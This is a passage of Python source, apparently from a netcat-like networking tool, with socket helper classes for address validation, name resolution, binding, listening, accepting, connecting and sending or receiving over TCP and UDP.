            "IPV6_HOPOPTS",
            "IPV6_NEXTHOP",
            "IPV6_PATHMTU",
            "IPV6_PKTINFO",
            "IPV6_RECVDSTOPTS",
            "IPV6_RECVHOPLIMIT",
            "IPV6_RECVHOPOPTS",
            "IPV6_RECVPKTINFO",
            "IPV6_RECVRTHDR",
            "IPV6_RECVTCLASS",
            "IPV6_RTHDR",
            "IPV6_RTHDRDSTOPTS",
            "IPV6_RTHDR_TYPE_0",
            "IPV6_RECVPATHMTU",
            "IPV6_TCLASS",
            "IPV6_USE_MIN_MTU",
        ],
        "TCP": [
            "TCP_NODELAY",
            "TCP_MAXSEG",
            "TCP_CORK",
            "TCP_KEEPIDLE",
            "TCP_KEEPINTVL",
            "TCP_KEEPCNT",
            "TCP_SYNCNT",
            "TCP_LINGER2",
            "TCP_DEFER_ACCEPT",
            "TCP_WINDOW_CLAMP",
            "TCP_INFO",
            "TCP_QUICKACK",
            "TCP_FASTOPEN",
        ],
    }

    # --------------------------------------------------------------------------
    # Static methods
    # --------------------------------------------------------------------------
    @staticmethod
    def is_ipv6_address(host):
        # type: (str) -> bool
        """Check if a given str is a valid IPv6 address."""
        # TODO: check for link-local addresses (start with: fe80)
        # https://stackoverflow.com/questions/3801701

        # [1/4] socket.inet_pton
        if hasattr(socket, "inet_pton"):
            try:
                socket.inet_pton(socket.AF_INET6, host)
                return True
            except socket.error:
                return False

        # [2/4] optional module: ipaddress
        try:
            addr = unicode(host)  # type: ignore
        except NameError:
            addr = host
        try:
            try:
                ipaddress.IPv6Address(addr)
                return True
            except ipaddress.AddressValueError:
                return False
        except NameError:
            pass

        # [3/4] regex
        # This is a poor mans solution, but we only want to know if it
        # is on the format of IPv6 and not if it is a valid IPv6. The
        # validation will be figured out during connect()
        reg = r"^([a-f0-9]{0,4}:){5}[a-f0-9]{0,4}$"
        if re.match(reg, host):
            return True

        # [4/4] Nope
        return False

    @staticmethod
    def is_ipv4_address(host):
        # type: (str) -> bool
        """Check if a given str is a valid IPv4 address."""
        # [1/5] socket.inet_aton
        if hasattr(socket, "inet_aton"):
            try:
                socket.inet_aton(host)
                return True
            except socket.error:
                return False

        # [2/5] socket.inet_pton
        if hasattr(socket, "inet_pton"):
            try:
                socket.inet_pton(socket.AF_INET, host)
                return True
            except socket.error:
                return False

        # [3/5] optional module: ipaddress
        try:
            addr = unicode(host)  # type: ignore
        except NameError:
            addr = host
        try:
            try:
                ipaddress.IPv4Address(addr)
                return True
            except ipaddress.AddressValueError:
                return False
        except NameError:
            pass

        # [4/5] regex
        # This is a poor mans solution, but we only want to know if it
        # is on the format of IPv4 and not if it is a valid IPv4. The
        # validation will be figured out during connect()
        reg = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"
        if re.match(reg, host):
            return True

        # [5/5] Nope
        return False

    # --------------------------------------------------------------------------
    # Get functions
    # --------------------------------------------------------------------------
    def get_iptos_by_name(self, name):
        # type: (str) -> int
        """Get IP Type of Service hexadecimal value by name."""
        assert name in self.__IP_TOS
        return self.__IP_TOS[name]

    def get_family_name(self, family):
        # type: (Union[socket.AddressFamily, int]) -> str
        """Returns human readable name of given address family as str."""
        try:
            return self.__AF_HUMAN[int(family)]
        except KeyError:
            self.__log.error(
                "Invalid key for address family: %s (type: %s) (valid: %s)",
                repr(family),
                repr(type(family)),
                repr(self.__AF_HUMAN),
            )
            return "unknown"

    def get_type_name(self, sock_type):
        # type: (int) -> str
        """Returns human readable name of given socket type as str."""
        try:
            return self.__ST_HUMAN[int(sock_type)]
        except KeyError:
            self.__log.error(
                "Invalid key for address sock_type: %s (type: %s) (valid: %s)",
                repr(sock_type),
                repr(type(sock_type)),
                repr(self.__ST_HUMAN),
            )
            return "unknown"

    def get_sock_opts(self, sock, opts):
        # type: (Sock, socket.socket, Optional[str]) -> List[str]
        """Debug logs configured socket options."""
        if opts is None:
            return []
        assert opts in ["all", "sock", "ipv4", "ipv6", "tcp"], "Value: {}".format(repr(opts))
        info = []
        for proto, optnames in self.__SOCK_OPTS.items():
            if opts == "all" or proto.lower() == opts:
                for optname in optnames:
                    if proto.lower() == "sock":
                        level = socket.SOL_SOCKET
                    elif proto.lower() == "ipv4":
                        level = socket.IPPROTO_IP
                    elif proto.lower() == "ipv6":
                        level = socket.IPPROTO_IPV6
                    elif proto.lower() == "tcp":
                        level = socket.IPPROTO_TCP
                    try:
                        info.append(
                            "{}: {}: {}".format(
                                proto,
                                optname,
                                sock.getsockopt(
                                    level, eval("socket." + optname)  # pylint: disable=eval-used
                                ),
                            )
                        )
                    except AttributeError:
                        pass
                    except (OSError, socket.error):
                        pass
        return info

    def gethostbyname(self, host, family, resolvedns):
        # type: (Sock, Optional[str], Union[socket.AddressFamily, int], bool) -> str
        """Translate hostname into a IP address for a given address family.

        Args:
            host (str): The hostname to resolvea.
            family (socket.family): IPv4 or IPv6 family

        Returns:
            str: Numeric IP address.

        Raises:
            socket.gaierror: If hostname cannot be resolved.
        """
        socktype = 0
        proto = 0
        flags = 0
        port = None
        family = int(family)

        # [1/4] Wildcard without host
        if host is None:
            if family == int(socket.AF_INET):
                self.__log.debug("Resolving IPv4 name not required, using wildcard: 0.0.0.0")
                return "0.0.0.0"
            if family == int(socket.AF_INET6):
                self.__log.debug("Resolving IPv6 name not required, using wildcard: ::")
                return "::"
        assert host is not None

        # [2/4] Already an IP address
        if family == int(socket.AF_INET6):
            if Sock.is_ipv6_address(host):
                self.__log.debug("Resolving IPv6 name not required, already an IP: %s", host)
                return host
            # Map IPv4 address to IPv6
            host6 = "::ffff:" + host
            if Sock.is_ipv6_address(host6):
                self.__log.debug("Resolving IPv4 name not required, changing to IPv6: %s", host6)
                return host6
        elif family == int(socket.AF_INET):
            if Sock.is_ipv4_address(host):
                self.__log.debug("Resolving IPv4 host not required, already an IP: %s", host)
                return host

        # [3/4] Do we disable DNS resolution?
        if not resolvedns:
            flags = socket.AI_NUMERICHOST

        # [4/4] Resolve
        try:
            infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
            addr = str(infos[0][4][0])
            self.__log.debug("Resolved %s host: %s", self.get_family_name(family), addr)
            return addr
        except (AttributeError, socket.gaierror) as error:
            msg = "Resolving {} host: {} failed: {}".format(
                self.get_family_name(family), str(host), str(error)
            )
            self.__log.debug(msg)
            raise socket.gaierror(msg)  # type: ignore

    # --------------------------------------------------------------------------
    # Create functions
    # --------------------------------------------------------------------------
    def create_socket(self, family, sock_type, reuse_addr, ip_tos_name=None):
        # type: (Union[socket.AddressFamily, int], int, bool, Optional[str]) -> socket.socket
        """Create TCP or UDP socket.

        Args:
            family (socket.family): The address family for which to create the socket for.
            sock_type (int): The socket type: socket.SOCK_DGRAM or socket.SOCK_STREAM
            reuse_addr (bool): Set SO_REUSEADDR on the socket.
            ip_tos_name (str): Optional IP type of service value to apply to socket

        Returns:
            socket.socket: Returns TCP or UDP socket for the given address family.

        Raises:
            socket.error: If socket cannot be created.
        """
        assert int(sock_type) in [int(socket.SOCK_DGRAM), int(socket.SOCK_STREAM)]
        try:
            if int(sock_type) == int(socket.SOCK_DGRAM):
                self.__log.debug(
                    "Creating (family %d/%s, UDP) socket", int(family), self.get_family_name(family)
                )
                sock = socket.socket(family, socket.SOCK_DGRAM)
            else:
                self.__log.debug(
                    "Creating (family %d/%s, TCP) socket", int(family), self.get_family_name(family)
                )
                sock = socket.socket(family, socket.SOCK_STREAM)
        except socket.error as error:
            msg = "Creating (family {}/{}, {}) socket failed: {}".format(
                int(family), self.get_family_name(family), self.get_type_name(sock_type), error
            )
            self.__log.debug(msg)
            raise socket.error(msg)

        if family == socket.AF_INET6:
            # On Linux, IPv6 sockets accept IPv4 too by default, but this makes
            # it impossible to bind to both 0.0.0.0 in IPv4 and :: in IPv6.
            # On other systems, separate sockets *must* be used to listen for
            # both IPv4 and IPv6. For consistency, always disable IPv4 on our
            # IPv6 sockets and use a separate ipv4 socket when needed.
            #
            # Python 2.x on windows doesn't have IPPROTO_IPV6.
            if hasattr(socket, "IPPROTO_IPV6"):
                self.__log.debug(
                    "Disabling IPv4 support on %s socket", self.get_family_name(family)
                )
                sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)

        # Get around the "[Errno 98] Address already in use" error, if the socket is still in wait
        # we instruct it to reuse the address anyway.
        if reuse_addr:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # If requested, set IP Type of Service value for current socket
        if ip_tos_name is not None:
            ip_tos_val = self.get_iptos_by_name(ip_tos_name)
            self.__log.debug("Setting IP_TOS to: %d (%s)", ip_tos_val, ip_tos_name)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, ip_tos_val)
        # All done, return it to the requestor
        return sock

    def bind(self, sock, addr, port):
        # type: (socket.socket, str, int) -> None
        """Bind the socket to an address.

        Args:
            sock (socket.socket): The socket to bind.
            addr (str): The numerical IP address to bind to.
            port (int): The port to bind to.

        Raises:
            socket.error if socket cannot be bound.
        """
        sock_family_name = self.get_family_name(sock.family)
        sock_type_name = self.get_type_name(sock.type)
        self.__log.debug(
            "Binding (family %d/%s, %s) socket to %s:%d",
            int(sock.family),
            sock_family_name,
            sock_type_name,
            addr,
            port,
        )
        try:
            sock.bind((addr, port))
        except (OverflowError, OSError, socket.gaierror, socket.error) as error:
            msg = "Binding (family {}/{}, {}) socket to {}:{} failed: {}".format(
                sock.family, sock_family_name, sock_type_name, addr, port, error
            )
            raise socket.error(msg)

    def listen(self, sock, backlog):
        # type: (socket.socket, int) -> None
        """Listen for connections made to the socket.

        Args:
            sock (socket.socket): The socket to listen on.
            backlog (int): Listen backlog

        Raises:
            socket.error: If listening fails.
        """
        try:
            self.__log.debug("Listening with backlog=%d", backlog)
            sock.listen(backlog)
        except socket.error as error:
            msg = "Listening failed: {}".format(error)
            self.__log.error(msg)
            raise socket.error(msg)

    def accept(
            self,
            sockets,  # type: List[socket.socket]
            has_quit,  # type: Callable[[], bool]
            select_timeout=0.01,  # type: float
    ):
        # type: (...) -> Tuple[socket.socket, Tuple[str, int]]
        """Accept a single connection from given list of sockets.

        Given sockets must be bound to an addr and listening for connections.

        Args:
            sock ([socket.socket]): List of sockets IPv4 and/or IPv6 to accept on.
            has_quit (Callable[[], bool]): A function that returns True if abort is requested.
            select_timeout (float): Timeout to poll sockets for connected clients.

        Returns:
            (socket.socket, str, int): Returns tuple of socket, address and port of client.

        Raises:
            socket.error: Raised if server cannot accept connection or stop signal is requested.
        """
        self.__log.debug("Waiting for TCP client")
        while True:
            try:
                ssockets = select.select(sockets, [], [], select_timeout)[
                    0
                ]  # type: List[socket.socket]
            except select.error as err:
                raise socket.error(err)
            if has_quit():
                raise socket.error("SOCK-QUIT signal ACK for accept(): raised socket.error()")
            for sock in ssockets:
                try:
                    conn, addr = sock.accept()
                except (socket.gaierror, socket.error) as error:
                    msg = "Accept failed: {}".format(error)
                    self.__log.error(msg)
                    raise socket.error(msg)
                self.__log.info(
                    "Client connected from %s:%d (family %d/%s, TCP)",
                    addr[0],
                    addr[1],
                    int(conn.family),
                    self.get_family_name(conn.family),
                )
                return conn, (addr[0], addr[1])

    def connect(
            self,
            sock,  # type: socket.socket
            addr,  # type: str
            port,  # type: int
            src_addr=None,  # type: Optional[str]
            src_port=None,  # type: Optional[int]
            udp_sconnect=False,  # type: bool
            udp_send_payload=b"",  # type: bytes
            udp_recv_bufsize=8192,  # type: int
            udp_recv_timeout=0.1,  # type: float
    ):
        # type: (...) -> Tuple[str, int]
        """Connect to a remote socket at given address and port.

        Args:
            sock (socket.socket): The socket to use for connecting/communication.
            addr (str): Numerical IP address of server to connect to.
            port (int): Port of server to connect to.

        Returns:
            Tuple[str,int]: Adress/port tuple of local bind of the client.

        Raises:
            socker.error: If client cannot connect to remote peer or custom bind did not succeed.
        """
        try:
            # If the socket was already closed elsewhere, it won't have family or type anymore
            sock_family_name = self.get_family_name(sock.family)
            sock_type_name = self.get_type_name(sock.type)
        except AttributeError as error:
            raise socket.error(error)

        # Bind to a custom addr/port
        if src_addr is not None and src_port is not None:
            try:
                self.__log.debug("Binding specifically to %s:%d", src_addr, src_port)
                self.bind(sock, src_addr, src_port)
            except socket.error as error:
                raise socket.error(error)
        try:
            self.__log.debug(
                "Connecting to %s:%d (family %d/%s, %s)",
                addr,
                port,
                int(sock.family),
                sock_family_name,
                sock_type_name,
            )

            # Ensure to use connect() protocol independent
            info = socket.getaddrinfo(addr, port, sock.family, sock.type, sock.proto)
            sock.connect(info[0][4])

            # UDP stateful connect
            # A UDP client doesn't know if the connect() was successful, so the trick
            # is to send an empty packet and see if an exception is triggered during
            # receive or simply a timeout (which means success).
            if udp_sconnect and int(sock.type) == int(socket.SOCK_DGRAM):
                assert type(udp_send_payload) is bytes
                assert type(udp_recv_bufsize) is int
                # Some applications like netcat do not like to receive empty
                # data, as they treat it as an EOF and will quit upon receive,
                # so we're using a nullbyte character instead.
                self.__log.debug(
                    "Trying to send %d bytes (%s) for UDP stateful connect",
                    len(udp_send_payload),
                    repr(udp_send_payload),
                )
                sock.send(udp_send_payload)
                sock.settimeout(udp_recv_timeout)
                try:
                    sock.recv(udp_recv_bufsize)
                except socket.timeout:
                    pass
                finally:
                    sock.settimeout(0)

        except (OSError, socket.error) as error:
            msg = "Connecting to {}:{} (family {}/{}, {}) failed: {}".format(
                addr,
                port,
                sock.family,
                sock_family_name,
                sock_type_name,
                error,
            )
            raise socket.error(msg)

        local = sock.getsockname()
        self.__log.debug(
            "Connected from %s:%d",
            local[0],
            local[1],
        )
        self.__log.info(
            "Connected to %s:%d (family %d/%s, %s)",
            addr,
            port,
            int(sock.family),
            sock_family_name,
            sock_type_name,
        )
        return (local[0], local[1])

    # --------------------------------------------------------------------------
    # Destroy functions
    # --------------------------------------------------------------------------
    def shutdown_recv(self, sock, name):
        # type: (socket.socket, str) -> None
        """Shuts down a socket for receiving data (only allow to send data).

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown for receive.
        """
        try:
            # (SHUT_RD)   0 = Done receiving (disallows receiving)
            # (SHUT_WR)   1 = Done sending (disallows sending)
            # (SHUT_RDWR) 2 = Both
            self.__log.trace("Shutting down %s socket for receiving", name)  # type: ignore
            sock.shutdown(socket.SHUT_RD)
        except (OSError, socket.error):
            # We do not log errors here, as unconnected sockets cannot
            # be shutdown and we want to throw any socket at this function.
            pass

    def shutdown_send(self, sock, name):
        # type: (socket.socket, str) -> None
        """Shuts down a socket for sending data (only allow to receive data).

        Args:
            name (str): Name of the socket used for logging purposes.
            sock (str): Socket to shutdown for send.
        """
        try:
            # (SHUT_RD)   0 = Done receiving (disallows receiving)
            # (SHUT_WR)   1 = Done sending (disallows sending)
            # (SHUT_RDWR) 2 = Both
            self.__log.trace("Shutting down %s socket for sending", name)  # type: ignore
            sock.shutdown(socket.SHUT_WR)
        except (OSError, socket.error):
            # We do not log errors here, as unconnected sockets cannot
            # be shutdown and we want to throw any socket at this function.
            pass

    def close(self, sock, name):  # pylint: disable=unused-argument,no-self-use
        # type: (socket.socket, str) -> None
        """Shuts down and closes a socket.

        Args:
            sock (socket.socket): Socket to shutdown and close.
            name (str): Name of the socket used for logging purposes.
        """
        # NOTE: Logging is removed here as this is too much overhead when using
        # the port scanner (it will have thousands of threads and too many
        # calls to the logger which will cause issues with its shutdown
        # and a massive performance degrade as well.
        try:
            # (SHUT_RD)   0 = Done receiving (disallows receiving)
            # (SHUT_WR)   1 = Done sending (disallows sending)
            # (SHUT_RDWR) 2 = Both
            # self.__log.trace("Shutting down %s socket", name)  # type: ignore
            sock.shutdown(socket.SHUT_RDWR)
        except (OSError, socket.error):
            # We do not log errors here, as unconnected sockets cannot
            # be shutdown and we want to throw any socket at this function.
            pass
        try:
            # self.__log.trace("Closing %s socket", name)  # type: ignore
            sock.close()
        except (OSError, socket.error):
            pass
            # self.__log.trace("Could not close %s socket: %s", name, error)  # type: ignore


class Net(object):
    """Provides an abstracted server client socket for TCP and UDP."""

    # --------------------------------------------------------------------------
    # Constructor / Destructor
    # --------------------------------------------------------------------------
    def __init__(self, encoder, ssig, options):
        # type: (StringEncoder, InterruptHandler, DsSock) -> None
        """Instantiate Sock class.

        Args:
            encoder (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
            ssig (InterruptHandler): Used to stop blocking loops.
            options (DsSock): Instance of DsSock.
        """
        self.__log = logging.getLogger(__name__)  # type: logging.Logger
        self.__enc = encoder
        self.__ssig = ssig
        self.__options = options
        self.__sock = Sock()

        # Set families to listen on or connect to
        # Using a list here to ensure IPv6 will always come first
        if self.__options.ipv6:
            self.__families = [int(socket.AF_INET6)]
        elif self.__options.ipv4:
            self.__families = [int(socket.AF_INET)]
        else:
            self.__families = [
                int(socket.AF_INET6),
                int(socket.AF_INET),
            ]

        # The connection dictionary.
        # A dictionary is necessary, as we can have multiple entries for
        # IPv4 and IPv6 when using UDP in server mode.
        #
        # 1.) If the UDP server wants to send data to an UDP client,
        # it must first wait for the client to send data to get to know
        # it's IP address (we're not using connect() for UDP here).
        # 2.) As we allow IPv4 and IPv6 listening at the same time,
        # we must maintain both entries in that list, until the
        # UDP client has connected.
        # Once the UDP client has connected, all unconnected entries
        # will be removed and the protocol has been determined.
        # {
        #   <socket.family>:
        #     {
        #       "sock": socket.socket,      # <-- bind socket if server
        #       "conn": socket.socket,      # <-- send/recv socket
        #       "local_host": <hostname>,   # <-- (server only) hostname or ip address for binding
        #       "local_addr": <ip-addr>,    # <-- (server only) ip address for binding
        #       "local_port": <port>,       # <-- (server only) port for binding
        #       "remote_host": <hostname>,  # <-- hostname or ip address of remote end
        #       "remote_addr": <ip-addr>,   # <-- numerical ip address of remote end
        #       "remote_port": <port>,      # <-- port of remote end
        #     },
        # }
        self.__conns = {}  # type: Dict[int, SockConn]

        # The self.__conns dictionary can hold two entries: IPv4 and IPv6.
        # In client mode after successful connect, the unused entry is dropped.
        # In server mode we keep entries for TCP/re-accept() or UDP/connect.
        #
        # That would mean for send/recv functions in server mode, we would
        # always have to loop around entries in self.__conns. To avoid this
        # we keep track of the currently active connection in self.__active
        # and only use this,
        # {
        #    "af": socket.family,        # <-- the used socket family
        #    "conn": socket.socket,      # <-- send/recv socket
        #    "remote_addr": <ip-addr>,   # <-- numerical ip address of remote end
        #    "remote_port": <port>,      # <-- port of remote end
        # }
        self.__active = {}  # type: SockActive

        self.__udp_mode_server = False  # type: bool

    # --------------------------------------------------------------------------
    # Public Send / Receive Functions
    # --------------------------------------------------------------------------
    def send_eof(self):
        # type: () -> None
        """Close the active socket for sending. The remote part will get an EOF."""
        self.__sock.shutdown_send(self.__active["conn"], "conn")

    def send(self, data):
        # type: (bytes) -> int
        """Send data through a connected (TCP) or unconnected (UDP) socket.

        Args:
            data (bytes): The data to send.

        Returns:
            int: Returns total bytes sent.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """
        # UDP has some specialities as its socket is unconnected.
        # See also recv() for specialities on that side.

        # In case of sending data to an UDP client, we need to initially wait
        # until the client has first connected and told us its addr/port.
        if self.__udp_mode_server:
            # self.__active will be set in recv() by another thread
            if not self.__active:
                self.__log.warning("UDP client has not yet connected. Queueing message")
                while not self.__active:
                    if self.__ssig.has_sock_quit():
                        self.__log.trace(  # type: ignore
                            "SOCK-QUIT signal ACK in Net.send (while waiting for UDP client)"
                        )
                        return -1
                    time.sleep(0.01)

        curr = 0  # bytes send during one loop iteration
        send = 0  # total bytes send
        size = len(data)  # bytes of data that needs to be send

        # Loop until all bytes have been send
        while send < size:
            self.__log.debug(
                "Trying to send %d bytes to %s:%d",
                size - send,
                self.__active["remote_addr"],
                self.__active["remote_port"],
            )
            self.__log.trace("Trying to send: %s", repr(data))  # type: ignore
            try:
                # Only UDP server has not made a connect() to the socket, all others
                # are already connected and need to use send() instead of sendto()
                if self.__udp_mode_server:
                    curr = self.__active["conn"].sendto(
                        data, (self.__active["remote_addr"], self.__active["remote_port"])
                    )
                    send += curr
                else:
                    curr = self.__active["conn"].send(data)
                    send += curr
                if curr == 0:
                    self.__log.error("No bytes send during loop round.")
                    return 0
                # Remove 'curr' many bytes from byte for the next round
                data = data[curr:]
                self.__log.debug(
                    "Sent %d bytes to %s:%d (%d bytes remaining)",
                    curr,
                    self.__active["remote_addr"],
                    self.__active["remote_port"],
                    size - send,
                )
            except (IOError, OSError, socket.error) as error:
                msg = "Socket send Error: {}".format(error)
                raise socket.error(msg)
        return send

    def receive(self):
        # type: () -> bytes
        """Receive and return data from the connected (TCP) or unconnected (UDP) socket.

        Returns:
            bytes: Returns received data from connected (TCP) or unconnected (UDP) socket.

        Raises:
            socket.timeout: Except here to do an action when the socket is not busy.
            AttributeError: Except here when current instance has closed itself (Ctrl+c).
            socket.error:   Except here when unconnected or connection was forcibly closed.
            EOFError:       Except here when upstream has closed the connection via EOF.
        """
        # This is required for a UDP server that has no connected clients yet
        # and is waiting for data receival for the first time on either IPv4 or IPv6
        # to finally determine which of those two we're going to use and which
        # of them we will remove after succesfull connect.
        try:
            conns = select.select(
                [self.__conns[af]["conn"] for af in self.__conns if "conn" in self.__conns[af]],
                [],
                [],
                self.__options.recv_timeout,
            )[
                0
            ]  # type: List[socket.socket]
        # E.g.: ValueError: file descriptor cannot be a negative integer (-1)
        except (ValueError, AttributeError) as error:
            msg = "Connection was closed by self: [1]: {}".format(error)
            self.__log.debug(msg)
            raise AttributeError(msg)
        if not conns:
            # This is raised for the calling function to determine what to do
            # between timeouts (e.g.: check signals, etc)
            raise socket.timeout("timed out")  # type: ignore

        # We should always only have one active socket on which we receive data.
        assert len(conns) == 1
        conn = conns[0]  # type: socket.socket
        try:
            # https://manpages.debian.org/buster/manpages-dev/recv.2.en.html
            (data, addr) = conn.recvfrom(self.__options.bufsize)

        # [1/5] When closing itself (e.g.: via Ctrl+c and the socket_close() funcs are called)
        except AttributeError as error:
            msg = "Connection was closed by self: [2]: {}".format(error)
            self.__log.debug(msg)
            raise AttributeError(msg)

        # [2/5] Connection was forcibly closed
        # [Errno 107] Transport endpoint is not connected
        # [Errno 10054] An existing connection was forcibly closed by the remote host
        # [WinError 10054] An existing connection was forcibly closed by the remote host
        except (OSError, socket.error) as error:
            self.__log.debug("Connection error: %s", error)
            raise socket.error(error)

        # [3/5] Upstream (server or client) is gone.
        # In TCP, there is no such thing as an empty message, so zero means a peer disconnect.
        # In UDP, there is no such thing as a peer disconnect, so zero means an empty datagram.
        if not data:
            msg = "EOF: Remote finished sending."
            self.__log.info(msg)
            raise EOFError(msg)

        # [4/5] (UDP Server mode only)
        # 1.) The UDP server is only able to send data, if a client has sent data first,
        # as we do not do a connect() phase for UDP and therefore do not know its remote
        # addr/port before. See send() function for a blocking loop.
        # 2.) Additionally, we will always update its IP/port values to distinguish
        # the same connected client between a new/different connected client.
        if self.__udp_mode_server:
            # UDP client connects for the first time
            if not self.__active:
                self.__log.info(
                    "Client connected: %s:%d (family %d/%s, UDP)",
                    addr[0],
                    addr[1],
                    int(conn.family),
                    self.__sock.get_family_name(conn.family),
                )
            # A different UDP client connects
            elif self.__active["remote_addr"] != addr[0] or self.__active["remote_port"] != addr[1]:
                self.__log.info(
                    "New client connected: %s:%d (family %d/%s, UDP)",
                    addr[0],
                    addr[1],
                    int(conn.family),
                    self.__sock.get_family_name(conn.family),
                )
            # Set currently active UDP connection socket
            self.__active = {
                "af": conn.family,
                "conn": conn,
                "remote_addr": addr[0],
                "remote_port": addr[1],
            }

        # [5/5] We have data to process
        self.__log.debug(
            "Received %d bytes from %s:%d",
            len(data),
            self.__active["remote_addr"],
            self.__active["remote_port"],
        )
        self.__log.trace("Received: %s", repr(data))  # type: ignore
        return data

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def run_client(self, host, port):
        # type: (str, int) -> bool
        """Run and create a TCP or UDP client and connect to a remote peer.

        Args:
            addr (str): Numeric IP address to connect to (ensure to resolve a hostname beforehand).
            port (int): Port of the server to connect to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """
        # The connection dictionary.
        conns = {}  # type: Dict[int, SockConn]

        # [1/4] Add sockets to connection dictionary
        succ = 0
        for family in self.__families:
            try:
                conns[family] = {
                    "conn": self.__sock.create_socket(
                        family,
                        socket.SOCK_DGRAM if self.__options.udp else socket.SOCK_STREAM,
                        True,
                        self.__options.ip_tos,
                    )
                }
                succ += 1
            except socket.error:
                pass
        if succ == 0:
            return False

        # [2/4] Resolve address
        remove = []
        errors = []
        # NOTE: We're still looping over the initial family list
        # to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)
        for family in self.__families:
            if family in conns:
                try:
                    conns[family]["remote_host"] = host
                    conns[family]["remote_addr"] = self.__sock.gethostbyname(
                        host, family, not self.__options.nodns
                    )
                    conns[family]["remote_port"] = port
                except socket.gaierror as err:
                    remove.append(family)
                    errors.append(str(err))
        for family in remove:
            self.__sock.close(conns[family]["conn"], self.__sock.get_family_name(family))
            del conns[family]
        if not conns:
            for error in errors:
                self.__log.error("Resolve Error: %s", error)
            return False

        # [3/4] Connect
        remove = []
        errors = []
        # NOTE: We're still looping over the initial family list
        # to ensure order: IPv6 before IPv4 (the conn dict does not preserve order)
        for family in self.__families:
            if family in conns:
                try:
                    self.__sock.connect(
                        conns[family]["conn"],
                        conns[family]["remote_addr"],
                        conns[family]["remote_port"],
                        self.__options.src_addr,
                        self.__options.src_port,
                        self.__options.udp_sconnect,
                        self.__enc.encode(self.__options.udp_sconnect_word),
                        self.__options.bufsize,
                    )
                    # On successful connect, we can abandon/remove all other sockets
                    remove = [key for key in conns if key != family]
                    break
                except (OSError, socket.error) as err:
                    remove.append(family)
                    errors.append(str(err))
        for family in remove:
            self.__sock.close(conns[family]["conn"], self.__sock.get_family_name(family))
            del conns[family]
        if not conns:
            for error in errors:
                self.__log.error(error)
            return False

        # [4/4] Store connections and set active connection
        assert len(conns) == 1
        for family in conns:
            self.__active = {
                "af": family,
                "conn": conns[family]["conn"],
                "remote_addr": conns[family]["remote_addr"],
                "remote_port": conns[family]["remote_port"],
            }
        # Store sockets as a list
        self.__conns = conns
        # Print socket info
        for info in self.__sock.get_sock_opts(self.__active["conn"], self.__options.info):
            self.__log.info("[%s] %s", self.__sock.get_family_name(family), info)
        return True

    def run_server(self, host, port):
        # type: (Optional[str], int) -> bool
        # TODO: Integrate: --rebind(-wait|-robin)
        """Run and create a TCP or UDP listening server and wait for a client to connect.

        Args:
            addr (str): Numeric IP address to bind to (ensure to resolve a hostname beforehand).
            port (int): Port of the address to bind to.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """
        # The connection dictionary.
        conns = {}  # type: Dict[int, SockConn]

        # [1/4] Create socket
        succ = 0
        for family in self.__families:
            try:
                conns[family] = {
                    "sock": self.__sock.create_socket(
                        family,
                        socket.SOCK_DGRAM if self.__options.udp else socket.SOCK_STREAM,
                        True,
                        self.__options.ip_tos,
                    )
                }
                succ += 1
            except socket.error as err:
                self.__log.debug(err)
        if succ == 0:
            self.__log.error("Socket Error: Could not create any socket.")
            return False

        # [2/4] Resolve local address
        remove = {}
        for family in conns:
            try:
                conns[family]["local_addr"] = self.__sock.gethostbyname(
                    host, family, not self.__options.nodns
                )
                conns[family]["local_host"] = host
                conns[family]["local_port"] = port
            except socket.gaierror as err:
                remove[family] = str(err)
        for family in remove:
            self.__log.debug(
                "Removing (family %d/%s) due to: %s",
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family]["sock"], self.__sock.get_family_name(family))
            del conns[family]
        if not conns:
            self.__log.error("Resolve Error: Could not resolve any hostname")
            return False

        # [3/4] Bind socket
        remove = {}
        for family in conns:
            try:
                self.__sock.bind(conns[family]["sock"], conns[family]["local_addr"], port)
            except socket.error as err:
                remove[family] = str(err)
        for family in remove:
            self.__log.debug(
                "Removing (family %d/%s) due to: %s",
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family]["sock"], self.__sock.get_family_name(family))
            del conns[family]
        if not conns:
            self.__log.error("Bind Error: Could not bind any socket")
            return False

        # [UDP 4/4] There is no listen or accept for UDP
        if self.__options.udp:
            for family in conns:
                conns[family]["conn"] = conns[family]["sock"]
                self.__log.info(
                    "Listening on %s:%d (family %d/%s, UDP)",
                    conns[family]["local_addr"],
                    conns[family]["local_port"],
                    family,
                    self.__sock.get_family_name(family),
                )
            self.__conns = conns
            self.__udp_mode_server = True
            return True

        # [TCP 4/4] Requires listen and accept
        # (1/3) Listen
        remove = {}
        for family in conns:
            try:
                self.__sock.listen(conns[family]["sock"], self.__options.backlog)
                self.__log.info(
                    "Listening on %s:%d (family %d/%s, TCP)",
                    conns[family]["local_addr"],
                    conns[family]["local_port"],
                    family,
                    self.__sock.get_family_name(family),
                )
            except socket.error as err:
                remove[family] = str(err)
        for family in remove:
            self.__log.debug(
                "Removing (family %d/%s) due to: %s",
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family]["sock"], self.__sock.get_family_name(family))
            del conns[family]
        if not conns:
            self.__log.error("Could not listen on any address")
            return False

        # (2/3) Accept
        remove = {}
        try:
            conn, client = self.__sock.accept(
                [conns[family]["sock"] for family in conns], self.__ssig.has_sock_quit
            )
            conns[conn.family]["conn"] = conn
            conns[conn.family]["remote_addr"] = client[0]
            conns[conn.family]["remote_port"] = client[1]
        except socket.error as err:
            remove = {family: str(err) for family in conns}
        # On error, remove all bind sockets
        for family in remove:
            self.__log.debug(
                "Removing (family %d/%s) due to: %s",
                family,
                self.__sock.get_family_name(family),
                remove[family],
            )
            self.__sock.close(conns[family]["sock"], self.__sock.get_family_name(family))
            del conns[family]
        if not conns:
            return False

        # (3/3) Store connections
        for family in conns:
            if "conn" in conns[family]:
